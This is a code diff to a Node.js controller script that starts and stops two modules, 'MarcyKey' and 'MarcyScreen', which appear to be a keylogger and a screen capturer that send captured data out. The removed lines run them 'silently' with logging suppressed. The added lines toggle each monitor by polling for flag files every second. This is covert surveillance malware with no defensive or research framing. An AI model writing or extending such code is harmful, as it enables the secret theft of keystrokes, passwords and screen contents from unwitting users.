@@ -56,24 +56,44 @@ if (!checkSingleInstance()) {
     process.exit(1);
 }
 
+const keyFlagPath = path.join(__dirname, 'marcykey.flag');
+const screenFlagPath = path.join(__dirname, 'marcyScreen.flag');
+
 // Initialize instances using the factory functions
 const keyMonitor = MarcyKey();
 const screenMonitor = MarcyScreen();
 
-// Override the sendData method to add logging (optional - remove if you want completely silent)
-const originalSendData = keyMonitor.sendData;
-keyMonitor.sendData = async function(data, windowTitle = '') {
-    // Silent operation - no logging
-    return originalSendData.call(this, data, windowTitle);
-};
+let keyActive = false;
+let screenActive = false;
 
-// Start monitoring silently
-keyMonitor.start();
-screenMonitor.start();
+function checkFlags() {
+    const keyFlag = fs.existsSync(keyFlagPath);
+    const screenFlag = fs.existsSync(screenFlagPath);
+
+    if (keyFlag && !keyActive) {
+        keyMonitor.start();
+        keyActive = true;
+    } else if (!keyFlag && keyActive) {
+        keyMonitor.stop();
+        keyActive = false;
+    }
+
+    if (screenFlag && !screenActive) {
+        screenMonitor.start();
+        screenActive = true;
+    } else if (!screenFlag && screenActive) {
+        screenMonitor.stop();
+        screenActive = false;
+    }
+}
+
+// Poll every second
+const flagInterval = setInterval(checkFlags, 1000);
 
 // Handle process termination
 process.on('SIGINT', () => {
-    keyMonitor.stop();
-    screenMonitor.stop();
+    if (keyActive) keyMonitor.stop();
+    if (screenActive) screenMonitor.stop();
+    clearInterval(flagInterval);
     process.exit();
 }); 
